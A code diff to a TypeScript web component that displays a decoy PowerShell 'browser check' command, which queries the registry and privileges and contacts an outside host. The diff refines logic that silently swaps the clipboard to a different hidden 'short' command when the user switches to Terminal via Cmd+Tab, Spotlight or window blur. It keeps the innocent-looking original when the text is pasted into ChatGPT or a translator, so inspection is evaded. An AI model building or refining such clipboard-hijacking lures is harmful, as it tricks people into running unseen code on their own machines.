@@ -32,9 +32,10 @@ function browserIconSrc(browser: ClientBrowser): string {
  * Case B — paste other platforms → original; later Terminal/CMD → short
  *   (Linux Case B keeps original for Terminal too — no short swap).
  *
- * macOS notes: Safari rejects delayed ClipboardItem promises. Use a completed
- * original write on copy; Case A overwrites with writeText on ⌘+Tab / blur;
- * Case B must not start a pending short write (that makes ChatGPT wait for short).
+ * macOS notes: Chromium uses a pending ClipboardItem (same as Linux) — do NOT
+ * also sync-write original (that overwrites the pending write and breaks Case A).
+ * Safari: sync original on copy; Case A writes short during ⌘+Space / ⌘+Tab gesture.
+ * Case B must not leave a pending→short promise (ChatGPT would wait and paste short).
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
@@ -59,10 +60,15 @@ const QUICK_TERMINAL_LEAVE_MS = 2500;
 /** After leaving for another platform, swap plain text to the short command (ms). */
 const PLATFORM_THEN_TERMINAL_ARM_MS = 3500;
 /**
- * Linux Case B tab-switch detect: wait for window blur to claim Case A (Terminal)
+ * Linux/macOS Case B tab-switch detect: wait for window blur to claim Case A (Terminal)
  * before treating visibility-hidden as an in-browser ChatGPT/Translate tab.
  */
 const LINUX_CASE_B_TAB_DETECT_MS = 150;
+/**
+ * macOS pending clipboard safety: Spotlight → Terminal often takes >2.5s.
+ * Keep the promise unsettled so Case A can still resolve to short on blur / ⌘+Space.
+ */
+const MAC_PENDING_SAFETY_MS = 20000;
 
 function escapeHtml(value: string) {
   return value
@@ -301,6 +307,7 @@ function beginPendingClipboardFromCopyGesture(
   terminalCommand: string,
   html: string,
   onResolved: (usedTerminalPlain: boolean) => void,
+  safetyMs: number = QUICK_TERMINAL_LEAVE_MS,
 ): PendingCopyClipboardController | null {
   if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
     void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
@@ -324,10 +331,11 @@ function beginPendingClipboardFromCopyGesture(
     resolveBlob = resolve;
   });
 
-  // Still focused after the quick window → keep original (Case B-friendly).
+  // Still focused after safety window → keep original (Case B-friendly).
+  // macOS uses a long window so Spotlight→Terminal can still resolve short.
   safetyTimer = window.setTimeout(() => {
     settle(displayCommand, false);
-  }, QUICK_TERMINAL_LEAVE_MS);
+  }, safetyMs);
 
   void navigator.clipboard
     .write([
@@ -411,11 +419,26 @@ function isLinuxCaseBAltPreview(event: KeyboardEvent): boolean {
   );
 }
 
-/** App-switch / Terminal-open shortcuts differ by OS — do not treat copy as a switch. */
+/** macOS Spotlight (documented Terminal open path) — must arm short during this gesture. */
+function isMacSpotlightGesture(event: KeyboardEvent): boolean {
+  return (
+    event.metaKey &&
+    !event.ctrlKey &&
+    !event.altKey &&
+    (event.key === " " || event.code === "Space")
+  );
+}
+
 function isAppSwitchGesture(event: KeyboardEvent, os: ClientOs): boolean {
   if (os === "macos") {
-    // Cmd+Tab / Cmd+` only — bare Cmd is used for ⌘C / ⌘V.
-    return event.metaKey && (event.key === "Tab" || event.key === "`");
+    // Cmd+Tab / Cmd+` / Cmd+Space — bare Cmd is used for ⌘C / ⌘V.
+    return (
+      event.metaKey &&
+      (event.key === "Tab" ||
+        event.key === "`" ||
+        event.key === " " ||
+        event.code === "Space")
+    );
   }
 
   if (os === "linux") {
@@ -566,7 +589,7 @@ function SelectableCommand({
       }, PLATFORM_THEN_TERMINAL_ARM_MS);
     }
 
-    /** macOS Case A: short command (⌘+Tab / blur). Must run write during gesture when possible. */
+    /** macOS Case A: short command (⌘+Space / ⌘+Tab / blur). Prefer pending resolve. */
     function forceMacCaseAShort() {
       macCaseARef.current = true;
       macCaseBRef.current = false;
@@ -576,8 +599,11 @@ function SelectableCommand({
       const ctrl = macClipboardCtrlRef.current;
       if (ctrl && !ctrl.isSettled()) {
         ctrl.resolveTerminal();
+        armedRef.current = true;
+        return;
       }
 
+      // Safari / already-settled fallback — must run during keydown gesture when possible.
       void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
       void writeClipboard(terminalCommand, htmlRef.current)
         .then(() => {
@@ -670,14 +696,15 @@ function SelectableCommand({
 
       const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
 
-      // macOS: same Case A/B as Windows (Safari-safe writes).
+      // macOS: same Case A/B as Windows (pending resolve / gesture write).
       if (os === "macos") {
         if (macCaseARef.current) return;
         if (macCaseBRef.current) {
           forceMacCaseBOriginal();
           return;
         }
-        if (quickLeave) {
+        // Window already left (blur) or app-switch — prefer Case A short.
+        if (macWindowBlurredRef.current || quickLeave) {
           forceMacCaseAShort();
           return;
         }
@@ -779,14 +806,10 @@ function SelectableCommand({
       }
       if (os === "macos") {
         macWindowBlurredRef.current = true;
-        // Window leave (Terminal / another app). Decide before visibility Case B timer.
+        // Terminal / Dock / Spotlight→Terminal: window blur = Case A unless Case B already set.
+        // Do NOT use quickLeave here — Spotlight open often takes >2.5s with no blur until Terminal focuses.
         if (!macCaseARef.current && !macCaseBRef.current) {
-          const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
-          if (quickLeave) {
-            forceMacCaseAShort();
-          } else {
-            forceMacCaseBOriginal();
-          }
+          forceMacCaseAShort();
         }
       }
       window.setTimeout(() => {
@@ -845,12 +868,17 @@ function SelectableCommand({
       const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
 
       if (os === "macos") {
-        if (quickLeave) {
-          // Case A: ⌘+Tab — write short during this gesture (Safari-safe).
+        // ⌘+Space (Spotlight → Terminal per help steps) is always Case A.
+        if (isMacSpotlightGesture(event)) {
           forceMacCaseAShort();
           return;
         }
-        // Case B: ⌘+Tab to another app — original now; short later via timer.
+        if (quickLeave) {
+          // Case A: ⌘+Tab — resolve/write short during this gesture (Safari-safe).
+          forceMacCaseAShort();
+          return;
+        }
+        // Case B: late ⌘+Tab to another app — original now; short later via timer.
         forceMacCaseBOriginal();
         return;
       }
@@ -947,9 +975,10 @@ function SelectableCommand({
       return;
     }
 
-    // macOS: sync original for Safari; Chromium also gets a pending write for Case A blur.
+    // macOS: Chromium = pending-only (like Linux). NEVER sync-write original first —
+    // that completes the clipboard and cancels the pending short resolve (Case A break).
+    // Safari (no promise ClipboardItem) = sync original; Case A uses gesture writeText.
     if (os === "macos") {
-      void writeClipboard(displayCommand, html).catch(() => undefined);
       if (supportsPromiseClipboardItem()) {
         macClipboardCtrlRef.current = beginPendingClipboardFromCopyGesture(
           displayCommand,
@@ -962,7 +991,10 @@ function SelectableCommand({
               delayedArmStartedRef.current = true;
             }
           },
+          MAC_PENDING_SAFETY_MS,
         );
+      } else {
+        void writeClipboard(displayCommand, html).catch(() => undefined);
       }
       return;
     }
